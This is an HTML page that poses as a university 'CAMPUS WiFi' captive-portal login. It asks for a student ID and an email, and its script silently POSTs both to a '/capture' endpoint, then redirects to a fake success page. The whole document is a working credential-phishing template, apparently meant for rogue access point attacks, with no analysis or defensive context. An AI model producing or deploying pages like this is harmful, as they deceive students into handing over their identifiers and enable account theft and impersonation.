<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>University WiFi</title><style>*{margin:0;padding:0}body{font-family:Arial;background:linear-gradient(135deg,#003366,#0066cc);display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}.container{background:white;border-radius:10px;max-width:400px;width:100%;padding:40px 30px}.logo h1{color:#003366;font-size:28px;text-align:center;margin-bottom:30px}.form-group{margin-bottom:20px}label{display:block;margin-bottom:8px;color:#555;font-weight:500}input{width:100%;padding:12px;border:2px solid #ddd;border-radius:5px}input:focus{outline:none;border-color:#003366}button{width:100%;padding:14px;background:#003366;color:white;border:none;border-radius:5px;font-weight:bold;cursor:pointer}</style></head><body><div class="container"><div class="logo"><h1>CAMPUS WiFi</h1></div><form id="loginForm"><div class="form-group"><label>Student ID</label><input type="text" id="studentid" required placeholder="S12345678"></div><div class="form-group"><label>Email</label><input type="email" id="email" required placeholder="student@university.edu"></div><button type="submit">Connect</button></form></div><script>document.getElementById('loginForm').addEventListener('submit',function(e){e.preventDefault();const studentid=document.getElementById('studentid').value;const email=document.getElementById('email').value;console.log('[University] ID:',studentid,'Email:',email);fetch('/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({portal:'University',studentid:studentid,email:email})}).catch(err=>console.log(err));window.location.href='success.html';});</script></body></html>
